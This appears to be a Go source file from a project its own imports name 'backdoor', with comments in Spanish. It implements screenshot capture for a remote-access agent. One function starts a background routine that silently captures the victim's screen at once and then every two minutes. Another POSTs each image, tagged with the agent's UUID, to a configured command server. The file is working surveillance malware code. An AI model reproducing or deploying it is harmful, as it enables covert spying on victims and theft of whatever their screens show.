package handler

import (
	"backdoor/config"
	"backdoor/transport"
	"bytes"
	"fmt"
	"image/png"
	"log"
	"net/http"
	"time"

	"github.com/kbinani/screenshot"
)

func ScreenshotHandler(t transport.Transport) {
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		t.Write([]byte("Error al capturar pantalla\n"))
		return
	}

	var buf bytes.Buffer
	png.Encode(&buf, img)
	t.Write(buf.Bytes())
}

func StartScreenshotRoutine() {
	go func() {
		// —— Envía la primera captura inmediatamente ——
		if img, err := screenshot.CaptureDisplay(0); err == nil {
			var buf bytes.Buffer
			if err := png.Encode(&buf, img); err == nil {
				SendScreenshot(buf.Bytes())
			} else {
				log.Println("Error codificando primera imagen:", err)
			}
		} else {
			log.Println("Error capturando primera pantalla:", err)
		}

		// —— Luego cada 2 minutos ——
		ticker := time.NewTicker(2 * time.Minute)
		defer ticker.Stop()

		for range ticker.C {
			img, err := screenshot.CaptureDisplay(0)
			if err != nil {
				log.Println("Error capturando pantalla:", err)
				continue
			}
			var buf bytes.Buffer
			if err := png.Encode(&buf, img); err != nil {
				log.Println("Error codificando imagen:", err)
				continue
			}
			SendScreenshot(buf.Bytes())
		}
	}()
}
func SendScreenshot(data []byte) {
	req, err := http.NewRequest(
		"POST",
		fmt.Sprintf("http://%s:%s/screenshot?id=%s", config.Host, config.Port, config.UUID), // 🔧 Aquí va el UUID del agente
		bytes.NewReader(data),
	)

	if err != nil {
		log.Println("Error creando request de screenshot:", err)
		return
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println("Error enviando screenshot:", err)
		return
	}
	defer resp.Body.Close()
	log.Println("Screenshot enviado. Código:", resp.StatusCode)
}
